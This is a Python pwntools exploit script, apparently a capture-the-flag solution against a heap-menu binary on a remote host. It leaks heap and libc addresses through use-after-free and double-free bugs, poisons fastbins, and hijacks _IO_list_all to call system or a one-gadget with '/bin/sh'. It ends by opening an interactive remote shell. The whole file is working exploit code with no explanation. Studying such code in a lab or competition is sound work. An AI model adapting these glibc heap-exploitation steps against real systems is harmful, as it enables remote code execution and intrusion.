#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '178.62.40.102'
port = 6001

binary = "./f"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def alloc(index,context):
  r.recvuntil(":")
  r.sendline("1")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(":")
  r.send(context)
  pass

def edit():
  pass

def remove(index):
  r.recvuntil(":")
  r.sendline("3")
  r.recvuntil(":")
  r.sendline(str(index))
  pass

def show(index,start,end):
  r.recvuntil(":")
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  alloc(0,"1")
  alloc(1,"1")
  remove(1)
  remove(0)
  heap = u64(show(0,"","Done!").ljust(8,"\x00")) - 0x60
  print "heap =", hex(heap)

  alloc(0,"1")
  alloc(1,"A"*0x10 + p64(0) + p64(0x61) + p64(0) + p64(0x7fffffffffffffff) + p64(0)*2 + p64((heap+0x20-100)/2))
  alloc(2,"3")
  alloc(3,"4")
  alloc(4,"5")

  remove(0)
  remove(1)
  remove(0)
  alloc(0,p64(heap+0x20) + p64(0)*2 + p64(0x61))
  alloc(0,"F")
  alloc(0,p64(heap+0x20) + p64(0) + "/bin/sh\x00" + p64(0x61))
  alloc(0,"A"*0x30 + p64(0) + p64(0xc1))
  remove(1)
  libc.address = u64(show(1,"","Done!").ljust(8,"\x00")) - 0x3c4b78
  print "libc =",hex(libc.address)

  remove(4)
  alloc(4,p64(0) + p64(libc.symbols['_IO_list_all']-0x10) + p64(0) + p64(0) + p64(1) + p64(2))
  remove(2)
  remove(3)
  remove(2)
  alloc(2,p64(heap+0xf0) + "B"*0x18 + p64(0) + p64(0x61))
  alloc(3, p64(0))
  alloc(2,"B"*0x20 + p64(0) + p64(0x61))
  alloc(5,"D"*0x10 + p64(heap+0x190) + p64(0) + p64(0) + p64(libc.address + 0x3c37a0) + p64(libc.symbols["system"]))

  remove(0)
  #alloc(0,"A"*0x38 + p64(0xd1) + p64(0) + p64(libc.symbols['_IO_list_all']-0x10))
  alloc(0,"A"*0x38 + p64(0xd1) + p64(libc.address + 0x3c4b78) + p64(heap + 0x180))

  alloc(6,"A")
  remove(0)
  #alloc(0,"A"*0x50)
  alloc(0,"A"*0x30 + "/bin/sh\x00" + p64(0)*2 + p64(libc.address + 0xf1147))
  print hex(libc.address + 0xf1147)
  #alloc(0,"A"*0x30 + "/bin/sh\x00" + p64(0)*2 + p64(heap+0x180))
  #alloc(0,"A"*0x30 + "/bin/sh\x00" + p64(0)*2 + p64(0x44444444444444))
  raw_input("@")
  r.recvuntil(":")
  r.sendline("1")
  r.recvuntil(":")
  r.sendline("1")
  r.sendline("ls")

  r.interactive()

